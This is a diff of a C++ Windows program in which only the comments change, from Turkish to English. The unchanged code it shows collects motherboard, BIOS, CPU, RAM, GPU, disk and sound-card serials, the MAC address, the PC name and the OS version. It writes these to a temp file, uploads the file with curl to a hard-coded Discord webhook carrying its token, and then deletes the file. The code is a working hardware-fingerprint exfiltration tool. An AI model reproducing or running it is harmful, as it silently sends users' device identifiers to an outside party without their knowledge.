@@ -17,7 +17,7 @@ int main() {
 
     const std::wstring webhookUrl = L"https://canary.discord.com/api/webhooks/1197270625337741474/k5_T7_k2ukPGefroP7FTDwK9usVqMLYXY9Owntkmdkeyp8mFSUezR_EsnCe7trtA-ks0";
 
-    // Dosya yolu
+    // File path
     wchar_t tempPath[MAX_PATH];
     if (GetTempPathW(MAX_PATH, tempPath) == 0) {
         return 1;
@@ -26,13 +26,13 @@ int main() {
     std::wstring filePath = tempPath;
     filePath += L"\\1337.txt";
 
-    // Dosyayı oluştur ve aç
+    // Create and open the file
     std::wofstream file(filePath);
     if (!file.is_open()) {
         return 1;
     }
 
-    // WMI için gerekli COM nesnelerini başlat
+    // Initialize COM objects required for WMI
     IWbemLocator* pLoc = nullptr;
     IWbemServices* pSvc = nullptr;
 
@@ -58,7 +58,7 @@ int main() {
         return 1;
     }
 
-    // Anakart bilgilerini al
+    // Get motherboard information
     IEnumWbemClassObject* pEnumerator = nullptr;
     if (pSvc->ExecQuery(bstr_t(L"WQL"), bstr_t(L"SELECT * FROM Win32_BaseBoard"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &pEnumerator) == S_OK) {
         while (pEnumerator) {
@@ -80,7 +80,7 @@ int main() {
         }
     }
 
-    // Dosyaya BIOS bilgilerini ekle
+    // Get BIOS information
     if (pSvc->ExecQuery(bstr_t(L"WQL"), bstr_t(L"SELECT * FROM Win32_BIOS"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &pEnumerator) == S_OK) {
         while (pEnumerator) {
             IWbemClassObject* pclsObj = nullptr;
@@ -101,7 +101,7 @@ int main() {
         }
     }
 
-    // MAC adresini al
+    // Get MAC address
     IP_ADAPTER_INFO adapterInfo[16];
     ULONG adapterInfoSize = sizeof(adapterInfo);
     if (GetAdaptersInfo(adapterInfo, &adapterInfoSize) == ERROR_SUCCESS) {
@@ -112,7 +112,7 @@ int main() {
         }
     }
 
-    // CPU serial numarasını al
+    // Get CPU serial number
     if (pSvc->ExecQuery(bstr_t(L"WQL"), bstr_t(L"SELECT ProcessorId FROM Win32_Processor"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &pEnumerator) == S_OK) {
         while (pEnumerator) {
             IWbemClassObject* pclsObj = nullptr;
@@ -133,7 +133,7 @@ int main() {
         }
     }
 
-    // RAM serı numarası
+    // Get RAM serials
     if (pSvc->ExecQuery(bstr_t(L"WQL"), bstr_t(L"SELECT * FROM Win32_PhysicalMemory"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &pEnumerator) == S_OK) {
         while (pEnumerator) {
             IWbemClassObject* pclsObj = nullptr;
@@ -154,7 +154,7 @@ int main() {
         }
     }
 
-    // GPU serı numarası
+    // Get GPU Serials
     if (pSvc->ExecQuery(bstr_t(L"WQL"), bstr_t(L"SELECT * FROM Win32_VideoController"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &pEnumerator) == S_OK) {
         while (pEnumerator) {
             IWbemClassObject* pclsObj = nullptr;
@@ -175,7 +175,7 @@ int main() {
         }
     }
 
-    // Disk sürücüleri seri numaralarını al
+    // Get serials of disk drives
     if (pSvc->ExecQuery(bstr_t(L"WQL"), bstr_t(L"SELECT * FROM Win32_DiskDrive"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &pEnumerator) == S_OK) {
         while (pEnumerator) {
             IWbemClassObject* pclsObj = nullptr;
@@ -196,7 +196,7 @@ int main() {
         }
     }
 
-    // Ses kartları seri numaralarını al
+    // Get serials of sound cards
    if (pSvc->ExecQuery(bstr_t(L"WQL"), bstr_t(L"SELECT * FROM Win32_SoundDevice"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &pEnumerator) == S_OK) {
        while (pEnumerator) {
            IWbemClassObject* pclsObj = nullptr;
@@ -217,7 +217,7 @@ int main() {
         }
     }
 
-   // USB cihazları seri numaralarını al
+   // Get serials of USB devices
 
    /*
   if (pSvc->ExecQuery(bstr_t(L"WQL"), bstr_t(L"SELECT * FROM Win32_USBControllerDevice"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &pEnumerator) == S_OK) {
@@ -241,7 +241,7 @@ int main() {
    }
    */
 
-   // Bilgisayar adını al
+   // Get PC Name
    if (pSvc->ExecQuery(bstr_t(L"WQL"), bstr_t(L"SELECT * FROM Win32_ComputerSystem"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &pEnumerator) == S_OK) {
        while (pEnumerator) {
            IWbemClassObject* pclsObj = nullptr;
@@ -262,7 +262,7 @@ int main() {
        }
    }
 
-   // SMBIOS Manufacturer bilgisini al
+   // Get SMBIOS Manufacturer information
    if (pSvc->ExecQuery(bstr_t(L"WQL"), bstr_t(L"SELECT * FROM Win32_SystemEnclosure"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &pEnumerator) == S_OK) {
        while (pEnumerator) {
            IWbemClassObject* pclsObj = nullptr;
@@ -286,7 +286,7 @@ int main() {
    }
 
 
-    // Ekran Kartı Bilgileri
+    // Get GPU information
     if (pSvc->ExecQuery(bstr_t(L"WQL"), bstr_t(L"SELECT * FROM Win32_DisplayConfiguration"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &pEnumerator) == S_OK) {
         while (pEnumerator) {
             IWbemClassObject* pclsObj = nullptr;
@@ -307,7 +307,7 @@ int main() {
         }
     }
 
-    // Windows Versiyonu
+    // Windows Version
     if (pSvc->ExecQuery(bstr_t(L"WQL"), bstr_t(L"SELECT * FROM Win32_OperatingSystem"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &pEnumerator) == S_OK) {
         while (pEnumerator) {
             IWbemClassObject* pclsObj = nullptr;
@@ -328,7 +328,7 @@ int main() {
         }
     }
 
-    // İşlemci Marka ve Model Bilgisi
+    // Get CPU Brand and Model Information
     if (pSvc->ExecQuery(bstr_t(L"WQL"), bstr_t(L"SELECT * FROM Win32_Processor"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &pEnumerator) == S_OK) {
         while (pEnumerator) {
             IWbemClassObject* pclsObj = nullptr;
@@ -370,17 +370,17 @@ int main() {
     pLoc->Release();
     CoUninitialize();
 
-    // Dosyayı kapat
+    // Close File
     file.close();
 
-    // curl komutunu oluştur ve çalıştır
+    // Create and run the curl command
     std::wstring curlCommand = L"curl -X POST -H \"Content-Type: multipart/form-data\" -F \"file=@" + filePath + L"\" " + webhookUrl + L" > NUL";
     _wsystem(curlCommand.c_str());
 
-    // Dosyayı sil
+    // Delete File
     if (DeleteFileW(filePath.c_str()) == 0) {
         return 1;
     }
 
-    return 0;
+    return 0;  // Thats it
 }
